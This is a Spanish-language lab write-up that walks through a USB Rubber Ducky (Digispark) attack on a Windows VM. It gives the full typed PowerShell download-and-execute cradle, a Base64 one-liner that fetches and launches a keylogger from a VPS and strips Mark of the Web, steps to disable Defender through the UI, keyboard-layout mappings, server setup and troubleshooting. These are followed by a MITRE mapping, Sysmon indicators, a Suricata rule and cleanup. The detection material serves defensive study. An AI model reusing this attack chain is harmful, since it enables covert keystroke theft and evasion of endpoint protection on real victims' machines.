---
icon: keyboard
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
  tags:
    visible: true
  actions:
    visible: true
  anchors:
    visible: true
---

> Laboratorio didáctico y aislado: un Digispark (Rubber Ducky) teclea un comando en una VM Windows que descarga y ejecuta un cliente que exfiltra pulsaciones de teclado a un VPS controlado. Incluye análisis defensivo, MITRE ATT&CK y reglas de detección.
---

# Rubber Ducky — Laboratorio didáctico de keylogger exfiltrando por TCP

{% hint style="danger" %}
**Aviso legal y ético — leer antes de continuar**

Este documento describe un artefacto tipo *Rubber Ducky* con fines **exclusivamente didácticos y defensivos**, dentro de un laboratorio **aislado y controlado** que es propiedad del autor. Su objetivo es entender cómo funciona este tipo de mecanismos para poder **detectarlos, analizarlos y mitigarlos**.

- Usarlo contra equipos que no son tuyos, o sin consentimiento explícito, **es delito** (arts. 197, 197 bis y 264 del Código Penal español).
- No publiques, compartas ni uses el payload como herramienta lista para usar contra terceros.
- Todo el laboratorio se ejecuta sobre tu propia VM y tu propio VPS de pruebas, nunca conectado a redes ajenas.

*Todos los datos técnicos del documento (IPs, dominios, identificadores y nombres de ficheros) son ficticios y siguen los rangos reservados para documentación (RFC 5737/1036). No apuntan a sistemas reales.*
{% endhint %}

## 🎯 1. Resumen del laboratorio

El laboratorio consta de **tres piezas** encadenadas:

```text
┌────────────────────┐          ┌──────────────────────────┐        ┌─────────────────────┐
│     Digispark      │          │   Windows VM (víctima)   │        │  VPS (atacante)     │
│  (Rubber Ducky)    │─────────▶│  Cambia a inglés,        │───────▶│  Sirve b64.txt      │
│  Teclea el comando │   USB    │  teclea el comando,      │  HTTP  │  Sirve cliente.exe  │
│                    │          │  ejecuta cliente.exe     │        │  Escucha server.py  │
└────────────────────┘          └──────────────────────────┘        └─────────────────────┘
                                          │                     ▲
                                          └──── TCP NDJSON ─────┘
                                              (puerto 5782)
```

| Componente | Papel en el laboratorio |
| :--- | :--- |
| **Digispark** | Emula un teclado USB y teclea un comando en la VM Windows. |
| **Windows VM** | Al recibir el comando, descarga un fichero Base64, lo decodifica y ejecuta el payload, que descarga y lanza `cliente.exe`. |
| **cliente.exe** | Captura las pulsaciones de teclado y las envía por TCP al VPS. |
| **VPS** | Sirve los ficheros (`b64.txt`, `cliente.exe`) por HTTP y, a la vez, ejecuta `server.py` para recibir los eventos de teclado. |

---

## 💻 2. El comando que se teclea en la VM

El Digispark teclea, carácter a carácter, el siguiente comando de PowerShell:

```powershell
powershell -Command "iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(([System.Text.Encoding]::UTF8.GetString((iwr -UseBasicParsing 'https://drive.google.com/uc?export=download&id=1AbCdEfGhIjKlMnOpQrStUvWxYz1234567').Content).Trim()))))"
```

### 2.1. Qué hace cada parte

| Bloque | Función |
| :--- | :--- |
| `powershell -Command "..."` | Lanza PowerShell y le pasa el bloque entrecomillado como comando. |
| `iwr -UseBasicParsing 'URL'` | Descarga el contenido de la URL (el fichero Base64 alojado públicamente). |
| `.Content` | Devuelve el contenido de la respuesta (en algunos casos, `byte[]`). |
| `[System.Text.Encoding]::UTF8.GetString(...)` | Convierte esos bytes a string UTF-8. |
| `.Trim()` | Quita espacios y saltos de línea alrededor. |
| `[System.Convert]::FromBase64String(...)` | Decodifica el Base64 a bytes UTF-16LE. |
| `[System.Text.Encoding]::Unicode.GetString(...)` | Convierte esos bytes a string UTF-16LE → texto legible. |
| `iex (...)` | Ejecuta el string resultante como comando de PowerShell. |

### 2.2. El payload decodificado

El fichero Base64 codifica la expresión **UTF-16LE** del siguiente *one-liner* (datos ficticios):

```powershell
$d=@([Environment]::GetFolderPath('Desktop'),
     (Join-Path $env:USERPROFILE 'Desktop'),
     (Join-Path $env:USERPROFILE 'Escritorio')) |
   ?{Test-Path $_} | select -First 1;
$c=Join-Path $d 'DocumentosPrivados2026';
New-Item -ItemType Directory -Path $c -Force | Out-Null;
$e=Join-Path $c 'cliente.exe';
iwr 'http://198.51.100.10:5782/cliente.exe' -OutFile $e;
Unblock-File $e;
& $e
```

En una sola línea (que es como se codificó):

```powershell
$d=@([Environment]::GetFolderPath('Desktop'),(Join-Path $env:USERPROFILE 'Desktop'),(Join-Path $env:USERPROFILE 'Escritorio'))|?{Test-Path $_}|select -First 1;$c=Join-Path $d 'DocumentosPrivados2026';New-Item -ItemType Directory -Path $c -Force|Out-Null;$e=Join-Path $c 'cliente.exe';iwr 'http://198.51.100.10:5782/cliente.exe' -OutFile $e;Unblock-File $e;& $e
```

### 2.3. El *one-liner*, paso a paso

1. **Detecta el escritorio del usuario**, probando en orden y quedándose con la primera carpeta que exista:
   - `[Environment]::GetFolderPath('Desktop')` (respeta redirecciones a OneDrive).
   - `%USERPROFILE%\Desktop` (Windows en inglés).
   - `%USERPROFILE%\Escritorio` (Windows en español).
2. **Construye la ruta de la carpeta camuflada**: `$c = <escritorio>\DocumentosPrivados2026`.
3. **Crea la carpeta** si no existe (`New-Item -ItemType Directory -Force`).
4. **Construye la ruta del ejecutable**: `$e = <escritorio>\DocumentosPrivados2026\cliente.exe`.
5. **Descarga el cliente** con `Invoke-WebRequest` hacia el VPS de laboratorio.
6. **Quita el bloqueo de zona** (*Mark of the Web*) con `Unblock-File $e` (evita que SmartScreen lo bloquee).
7. **Ejecuta el cliente**: `& $e` en segundo plano.

---

## ⌨️ 3. Por qué el comando se trocea en caracteres

El Digispark no puede teclear directamente los símbolos del comando tal cual, por dos motivos:

1. **Envía scancodes US**, pero la VM Windows tiene **layout español**.
2. Muchos caracteres (`"`, `:`, `(`, `)`, `=`, `/`, `[`, `]`, ...) están en **teclas físicas distintas** entre US y ES.

```text
✅ Caso que FUNCIONA:  Digispark teclea "  →  envía Shift+2  →  Windows español recibe "
❌ Caso que FALLA:     Digispark teclea [  →  envía scancode de [ US  →  Windows recibe `
```

Por eso el sketch tiene un **mapeo explícito** para cada carácter que no coincide en US/ES:

| Carácter | Cómo lo emite el sketch |
| :--- | :--- |
| `"` | `sendKeyStroke(SC_2, SHIFT)` |
| `'` | `sendKeyStroke(SC_MINUS, 0)` |
| `:` | `sendKeyStroke(SC_PERIOD, SHIFT)` |
| `/` | `sendKeyStroke(SC_7, SHIFT)` |
| `(` | `sendKeyStroke(SC_8, SHIFT)` |
| `)` | `sendKeyStroke(SC_9, SHIFT)` |
| `=` | `sendKeyStroke(SC_0, SHIFT)` |
| `[` | `sendKeyStroke(SC_LBRACKET, ALT+CTRL)` (AltGr) |
| `]` | `sendKeyStroke(SC_RBRACKET, ALT+CTRL)` |
| `?` | `sendKeyStroke(SC_MINUS, SHIFT)` |
| `&` | `sendKeyStroke(SC_6, SHIFT)` |
| `-` | `sendKeyStroke(SC_SLASH, 0)` |

Los caracteres que **coinciden en US y ES** (letras, números, `.`, `,`) se teclean con `print` directo.

> 💡 **Lección defensiva:** el layout del teclado es un vector *y* una firma. Un Rubber Ducky real depende del layout para funcionar, y eso deja trazas (comandos que fallan con caracteres específicos).

---

## 🔧 4. Estructura del sketch

### 4.1. Fase 0 — Desactivar Windows Defender

El sketch abre **Configuración → Seguridad de Windows** con `Win+S`, escribe *seguridad*, navega con `Tab` y pulsa `Space` para desactivar la protección en tiempo real.

```c
DigiKeyboard.sendKeyStroke(KEY_S, MOD_GUI_LEFT);
DigiKeyboard.print("seguridad");
// ... navegación con Tab ...
DigiKeyboard.sendKeyStroke(KEY_SPACE);
```

**Por qué:** Defender bloquea `cliente.exe` en cuanto lo ve (es un PyInstaller con hook de teclado). Sin exclusión previa, el binario desaparece antes de ejecutarse.

{% hint style="warning" %}
**Señal de ataque:** en un entorno real, la desactivación de Defender vía **UI es detectable**. En un SOC dispara eventos de **Sysmon** y de **Windows Defender ATP** — es la primera alarma sonora de esta cadena.
{% endhint %}

### 4.2. Fase 1 — Lanzar `cmd`

```c
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);   // Win+R
DigiKeyboard.print("cmd");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
```

Se abre `cmd` (no PowerShell) por dos motivos:

| Motivo | Explicación |
| :--- | :--- |
| **Líneas largas** | `cmd` acepta líneas largas sin el límite de PSReadLine (~500 caracteres). |
| **Aislamiento** | Evita que el intérprete de PowerShell interprete el comando como algo distinto al pasarlo por `cmd /c`. |

### 4.3. Fase 2 — Teclear el comando completo

El comando se teclea **bloque a bloque**, con *delays* de **90-250 ms** entre caracteres para que Windows no pierda pulsaciones. Los caracteres especiales se emiten con `sendKeyStroke` + modificadores (`Shift`, `Alt+Ctrl` para AltGr).

### 4.4. Fase 3 — Ejecutar y cerrar

```c
DigiKeyboard.sendKeyStroke(KEY_ENTER);             // ejecuta el comando
DigiKeyboard.delay(15000);                         // margen para descargar + lanzar
DigiKeyboard.print("exit");                        // cierra cmd
DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);  // cierra Seguridad de Windows
```

---

## 🛠️ 5. Preparación del entorno (una sola vez)

### 5.1. En el VPS

#### a) Crear el `b64.txt` con el Base64

Genera el Base64 (UTF-16LE) del *one-liner* del payload y guárdalo en el VPS.

{% hint style="danger" %}
**Importante:** el fichero debe quedar **sin salto de línea final**, porque la decodificación estricta de `FromBase64String` / `-EncodedCommand` falla con un `0x0A` colgado al final.
{% endhint %}

```bash
cd /home/ubuntu/keylogger

# Opción A: genera el Base64 desde la propia consola de PowerShell
# (en tu VM de build) y pégalo en el VPS con un editor.

# Opción B: si ya tienes el Base64 en un editor, guárdalo:
printf '%s' '<BASE64-DEL-ONELINER>' > b64.txt
```

Verifica que **no tiene newline final**:

```bash
wc -c b64.txt             # debe ser exactamente la longitud del Base64
tail -c 1 b64.txt | xxd   # el último byte NO debe ser 0a (newline)
```

Si tiene newline, quítalo:

```bash
truncate -s -1 b64.txt
```

#### b) Colocar el `cliente.exe`

```bash
mkdir -p /home/ubuntu/keylogger/dist
# Copia cliente.exe compilado desde tu entorno de build
ls -la /home/ubuntu/keylogger/dist/cliente.exe
chmod +x /home/ubuntu/keylogger/dist/cliente.exe
```

#### c) Servir los archivos por HTTP

```bash
cd /home/ubuntu/keylogger
sudo python3 -m http.server 5782 --bind 0.0.0.0
```

Esto sirve ambos archivos:

- `http://198.51.100.10:5782/b64.txt`
- `http://198.51.100.10:5782/dist/cliente.exe`

Verificación desde el propio VPS:

```bash
curl -s http://localhost:5782/b64.txt | head -c 80
curl -sI http://localhost:5782/dist/cliente.exe
```

Y desde fuera (por ejemplo, desde tu portátil):

```bash
curl -sI http://198.51.100.10:5782/b64.txt
```

Debe devolver `HTTP/1.0 200 OK` y un `Content-Length` coherente.

#### d) Abrir el puerto 5782 en el firewall del VPS

```bash
sudo iptables -I INPUT 5 -p tcp --dport 5782 -j ACCEPT
sudo firewall-cmd --permanent --add-port=5782/tcp
sudo firewall-cmd --reload
```

{% hint style="warning" %}
**Restringe el acceso** a la IP pública desde la que se conecta tu Windows — nunca dejes el puerto abierto a Internet:

```bash
sudo iptables -R INPUT 5 -p tcp -s TU_IP_PUBLICA/32 --dport 5782 -j ACCEPT
```

Y en tu proveedor cloud (Security List / NSG), añade la *Ingress Rule* correspondiente **limitada a tu IP**, no `0.0.0.0/0`.
{% endhint %}

### 5.2. En Drive (alternativa al VPS para el `b64.txt`)

Si prefieres usar Drive para el Base64:

- [ ] Sube `b64.txt` a Drive.
- [ ] Clic derecho → **Compartir** → *Cualquier persona con el enlace* → **Lector**.
- [ ] Copia el **ID** del archivo (la parte entre `/d/` y `/view`).
- [ ] La URL de descarga directa es: `https://drive.google.com/uc?export=download&id=<ID>`

Prueba desde PowerShell:

```powershell
(iwr -UseBasicParsing 'https://drive.google.com/uc?export=download&id=<ID>').Content
```

Debe devolver el Base64. Si devuelve HTML o una página de confirmación, Drive está bloqueando la descarga directa y debes usar el **VPS en su lugar**.

### 5.3. En la VM Windows (una sola vez)

#### a) Evaluar el paquete en-US (opcional)

El comando usa `-Command` con caracteres que en teclado español salen mal, así que el comando se teclea con el layout español y usa `UTF8.GetString` para convertir bytes a texto. **No necesitas cambiar el layout.** Opcionalmente puedes instalar **en-US** para el Digispark: *Configuración → Hora e idioma → Idioma y región → Agregar idioma → English (United States)*.

#### b) Añadir la exclusión de Defender

Como el sketch desactiva Defender por UI, también puedes dejarlo ya excluido para el lab:

```powershell
# Como Administrador
Add-MpPreference -ExclusionPath "$env:USERPROFILE\Desktop\DocumentosPrivados2026"
```

#### c) Verificar la conectividad

```powershell
Test-NetConnection -ComputerName 198.51.100.10 -Port 5782
```

Debe devolver `TcpTestSucceeded : True`.

---

## 📡 6. Poner el VPS a la escucha

En el VPS, **en otra terminal** (distinta de la que sirve el HTTP), lanza el servidor:

```bash
cd /home/ubuntu/keylogger
python3 server.py --ip 0.0.0.0 --port 5782 --clean
```

Espera a ver:

```text
[clean] teclas en vivo (Ctrl+C para salir)
------------------------------------------------------------
2026-XX-XX XX:XX:XX | INFO | MainThread | Escuchando en 0.0.0.0:5782 (modo=clean, idle_timeout=5.0s)
```

{% hint style="info" %}
**Nota:** si `python3 -m http.server 5782` ya está usando el puerto 5782, tienes un conflicto. Soluciones:

1. Sirve el HTTP en el puerto **80** (`sudo python3 -m http.server 80`) y actualiza la URL del Base64 a `http://198.51.100.10/cliente.exe`.
2. O usa **puertos separados**: HTTP en 80, `server.py` en 5782.
{% endhint %}

---

## ▶️ 7. Ejecución

### 7.1. Flashear el Digispark

Con el sketch compilado y verificado:

- [ ] Herramientas → Placa → **Digispark (Default - 16.5mhz)**.
- [ ] **Subir**. Cuando aparezca `Plug in device now...`, enchufa el Digispark en el PC de desarrollo.
- [ ] Espera a `>> Micronucleus done. Thank you!`.

### 7.2. Enchufar el Digispark en la VM Windows

{% hint style="warning" %}
**Checklist previa** — no toques nada durante los próximos 30-40 segundos:

- [ ] Cierra cualquier ventana de `cmd`/PowerShell en la VM.
- [ ] Asegúrate de que la VM tiene el layout **en español** (indicador `ESP` en la barra de tareas).
- [ ] Enchufa el Digispark en un **puerto USB de datos** (no en un hub alimentado).
- [ ] Ten la terminal de `server.py --clean` abierta y a la vista.
{% endhint %}

### 7.3. Qué ocurre, paso a paso

| Tiempo | Acción |
| :--- | :--- |
| `0-5 s` | Bootloader **micronucleus** (espera). |
| `5-10 s` | Delay inicial del sketch. |
| `~10 s` | Se abre **Configuración → Seguridad de Windows**. |
| `~12 s` | Se teclea *seguridad*, se navega con `Tab`, se pulsa `Space` para desactivar Defender. |
| `~20 s` | Se cierra Seguridad de Windows con `Alt+F4`. |
| `~22 s` | Se abre `cmd` con `Win+R`. |
| `~24-40 s` | Se teclea el comando completo, carácter a carácter. |
| `~40 s` | Se pulsa `Enter`. `cmd` ejecuta PowerShell, que descarga el Base64, lo decodifica y ejecuta el *one-liner*. |
| `~42 s` | El *one-liner* descarga `cliente.exe`, lo desbloquea y lo lanza. |
| `~45 s` | `cliente.exe` empieza a capturar teclas y a enviarlas al VPS. |

### 7.4. Verificar en el VPS

En la terminal donde corre `server.py --clean`, deberías ver:

```text
2026-XX-XX XX:XX:XX | INFO | Conn-198.51.100.50:53012 | Cliente conectado: 198.51.100.50:53012
[HH:MM:SS] hola mundo
[HH:MM:SS] esto es una prueba
```

Cada línea corresponde a una ráfaga de teclas tecleadas en la VM Windows.

### 7.5. Verificar en la VM Windows

En el escritorio de la VM debería aparecer la carpeta `DocumentosPrivados2026`:

```powershell
Get-ChildItem "$env:USERPROFILE\Desktop\DocumentosPrivados2026" -Force
```

Con:

- `cliente.exe` (~10 MB).
- `cliente.log` (con el arranque y los intentos de conexión).
- `cliente_crash.log` si algo falló.

Y comprobar que el proceso está vivo:

{% tabs %}
{% tab title="Nombre del proceso" %}

```powershell
Get-Process cliente -ErrorAction SilentlyContinue
```

{% endtab %}
{% tab title="Por PID" %}

```powershell
Get-WmiObject Win32_Process -Filter "Name = 'cliente.exe'" | Select-Object ProcessId, CommandLine, ExecutablePath
```

{% endtab %}
{% endtabs %}

---

## 🚧 8. Solución de problemas

| Síntoma | Causa probable | Solución |
| :--- | :--- | :--- |
| El Digispark no hace nada | No se grabó bien / delay inicial corto | Sube el delay a `8000`; reflashea |
| Se abre Win+R pero no se teclea nada | Foco perdido | Sube el delay tras `Win+R` a `1500` |
| El comando sale cortado o mal | Timing | Sube *delays* de 90 a 120 ms |
| El comando sale bien pero `iwr` falla | Drive devuelve HTML o error | Usa el VPS en lugar de Drive |
| `[System.Byte]` no contiene ningún método llamado `'Trim'` | `iwr` devuelve bytes | Añade `[System.Text.Encoding]::UTF8.GetString(...)` (ya está en el sketch) |
| `cliente.exe` no aparece en la carpeta | Defender lo bloquea | Añade exclusión de Defender manualmente antes de la prueba |
| El servidor no recibe eventos | Firewall en el VPS o en el proveedor cloud | Abre el 5782 en `iptables` y en la Security List |
| El servidor recibe conexión pero no teclas | El hook de `pynput` no captura | Comprueba que la VM no está en una app elevada (UAC) |

---

## 🛡️ 9. Valor didáctico y detección defensiva

Este artefacto, funcionando, es un **caso de estudio perfecto para *threat hunting***.

### 9.1. Mapeo MITRE ATT&CK

| Fase | Técnica ATT&CK | ID | Evidencia en este laboratorio |
| :--- | :--- | :--- | :--- |
| Acceso inicial | Hardware Additions: Peripheral Device | [T1200.001](https://attack.mitre.org/techniques/T1200/001/) | Digispark emulando teclado USB físico |
| Ejecución | User Execution | T1204 | La víctima "ejecuta" el comando viajando por `cmd` |
| Parseo | Command and Scripting Interpreter: PowerShell | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | `powershell -Command "iex (...)"` con Base64 |
| Defensa | Impair Defenses: Disable Windows Tools | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) | Desactivación de Defender por UI con `Win+S` |
| Instalación | Ingress Tool Transfer | [T1105](https://attack.mitre.org/techniques/T1105/) | `iwr` descarga el Base64 y `cliente.exe` |
| Persistencia/MotW | Mark-of-the-Web Bypass | T1553.005 | `Unblock-File $e` tras la descarga |
| Acceso | Masquerading: Match Legitimate Name | T1036.004 | Carpeta `DocumentosPrivados2026` con exe genérico |
| Captura | Input Capture: Keylogging | [T1056.001](https://attack.mitre.org/techniques/T1056/001/) | Hook de teclado de `cliente.exe` |
| Exfiltración | Exfiltration Over C2 Channel | [T1041](https://attack.mitre.org/techniques/T1041/) | NDJSON en claro por TCP:5782 hacia el C2 |

### 9.2. En el endpoint (Sysmon + Defender)

**Sysmon Event ID 1 (ProcessCreate):**

- `powershell.exe -Command "iex (...)"` con el Base64.
- `cliente.exe` con `ParentImage = cmd.exe`.

**Sysmon Event ID 3 (NetworkConnect):**

- Conexión desde `cliente.exe` a `198.51.100.10:5782`.
- Conexión desde `powershell.exe` a `drive.google.com:443`.

**Sysmon Event ID 11 (FileCreate):**

- `cliente.exe` en `C:\Users\<user>\Desktop\DocumentosPrivados2026\`.

**Defender:**

- Detección de `Trojan:Win32/Wacatac.B!ml` o similar (falso positivo típico de PyInstaller con hook de teclado).
- Evento de desactivación de la protección en tiempo real.

### 9.3. En la red

Firma de tráfico **NDJSON en claro** al puerto 5782. Regla Suricata casera:

```javascript
alert tcp any any -> any 5782 (msg:"Posible keylogger lab"; \
  content:"\"kind\":\"press\""; sid:1000001;)
```

`User-Agent` de PowerShell (`Mozilla/5.0 (Windows NT; Windows NT 10.0; es-ES) WindowsPowerShell/5.1...`) en la descarga del Base64 desde Drive.

### 9.4. Lecciones defensivas

| Lección | Implicación |
| :--- | :--- |
| **UAC y Defender son las primeras barreras** | La desactivación de Defender por UI es detectable y **debería alertar**. |
| **El layout del teclado como vector** | Los Rubber Ducky dependen del layout para funcionar, y eso es una firma (comandos que fallan con caracteres específicos). |
| **Descarga desde Internet** | Cualquier proceso que descargue **y ejecute** contenido remoto debe alertar. |
| **Nombre del proceso irrelevante** | `cliente.exe` no dice nada. La detección se basa en **comportamiento** (`CommandLine`, `NetworkConnect`, `FileCreate`). |

---

## 🧹 10. Limpieza

Después del ejercicio, en la VM Windows:

```powershell
# Matar el proceso
Stop-Process -Name cliente -Force

# Borrar la carpeta
Remove-Item "$env:USERPROFILE\Desktop\DocumentosPrivados2026" -Recurse -Force

# Reactivar Defender
Set-MpPreference -DisableRealtimeMonitoring $false

# Quitar la exclusión
Remove-MpPreference -ExclusionPath "$env:USERPROFILE\Desktop\DocumentosPrivados2026"
```

En el VPS:

```bash
# Parar el servidor HTTP
sudo pkill -f "http.server"

# Parar el server.py (Ctrl+C en su terminal)

# Cerrar el puerto 5782
sudo iptables -D INPUT -p tcp --dport 5782 -j ACCEPT
```

Y retirar la *Ingress Rule* del 5782 en tu proveedor cloud.

{% hint style="danger" %}
**Checklist de cierre — no finishing sin esto:**

- [ ] Proceso `cliente` detenido y carpeta borrada en la VM.
- [ ] Defender **reactivado** y exclusión eliminada.
- [ ] VPS: servidor HTTP y `server.py` parados.
- [ ] Puerto 5782 cerrado en `iptables` y en la Security List del proveedor.
- [ ] Ningún artefacto publicado ni compartido fuera del laboratorio.
{% endhint %}

---

## 📎 11. Anexo: tabla de scancodes usada

Los scancodes del sketch siguen el estándar **USB HID** (*Keyboard Usage Page 0x07*). La tabla empírica US→ES, obtenida por pruebas en la VM, es:

| Carácter en pantalla | Combinación en el sketch |
| :--- | :--- |
| `-` | `SC_SLASH`, `0` |
| `'` | `SC_MINUS`, `0` |
| `"` | `SC_2`, `SHIFT` |
| `:` | `SC_PERIOD`, `SHIFT` |
| `/` | `SC_7`, `SHIFT` |
| `(` | `SC_8`, `SHIFT` |
| `)` | `SC_9`, `SHIFT` |
| `=` | `SC_0`, `SHIFT` |
| `[` | `SC_LBRACKET`, `ALT+CTRL` |
| `]` | `SC_RBRACKET`, `ALT+CTRL` |
| `?` | `SC_MINUS`, `SHIFT` |
| `&` | `SC_6`, `SHIFT` |
| `_` | `SC_SLASH`, `SHIFT` |
| `;` | `SC_COMMA`, `SHIFT` |
| `@` | `SC_2`, `ALT+CTRL` |
| `#` | `SC_3`, `ALT+CTRL` |
| `\|` | `SC_1`, `ALT+CTRL` |

---

## ✅ 12. Conclusión

Este laboratorio demuestra, de principio a fin, cómo funciona un Rubber Ducky real:

| Fase | Mecanismo |
| :--- | :--- |
| **Emulación de teclado USB** | El Digispark se hace pasar por un teclado y teclea por el usuario. |
| **Ejecución sigilosa** | Un comando corto descarga un Base64 y lo ejecuta en memoria. |
| **Descarga y ejecución** | El payload real (`cliente.exe`) se descarga desde el VPS y se lanza. |
| **Exfiltración** | El cliente envía las pulsaciones a un servidor controlado. |

Y demuestra también, **por contraste, por qué las defensas ganan**:

```text
✅ Un EDR decente detecta la cadena completa en minutos.
✅ El layout del teclado es una barrera real para el atacante.
✅ La necesidad de desactivar Defender es la primera alarma sonora.
✅ El tráfico sin cifrar es trivialmente detectable.
```

> **La mejor forma de aprender a defender es construir el ataque una vez, en un entorno controlado, y entender por qué cada paso deja rastro.**
